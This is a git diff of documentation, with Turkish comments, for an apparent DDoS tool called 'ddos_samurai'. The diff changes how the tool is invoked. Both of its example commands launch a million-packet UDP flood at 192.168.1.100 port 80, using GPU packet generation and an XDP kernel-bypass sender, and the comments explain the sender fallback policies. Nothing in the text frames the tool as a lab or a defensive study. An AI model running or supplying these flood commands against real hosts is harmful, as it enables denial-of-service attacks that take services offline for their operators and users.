@@ -153,7 +153,7 @@ with XDPSender(interface="eth0") as sender:
 
 ```bash
 # XDP ile UDP flood
-sudo python3 cli.py --target 192.168.1.100 --port 80 \
+sudo python3 -m ddos_samurai.cli --target 192.168.1.100 --port 80 \
     --protocol udp --count 1000000 \
     --compute-backend cuda \
     --sender-backend xdp --sender-fallback-policy fail \
@@ -162,7 +162,7 @@ sudo python3 cli.py --target 192.168.1.100 --port 80 \
 # mode=2 (offload request) için politika:
 # --sender-fallback-policy fail  => hard policy (capability probe başarısızsa hata)
 # --sender-fallback-policy allow => soft policy (unsupported ise mode=1'e düşer)
-sudo python3 cli.py --target 192.168.1.100 --port 80 \
+sudo python3 -m ddos_samurai.cli --target 192.168.1.100 --port 80 \
     --protocol udp --count 1000000 \
     --sender-backend xdp --sender-fallback-policy allow \
     --xdp-interface eth0 --xdp-mode 2
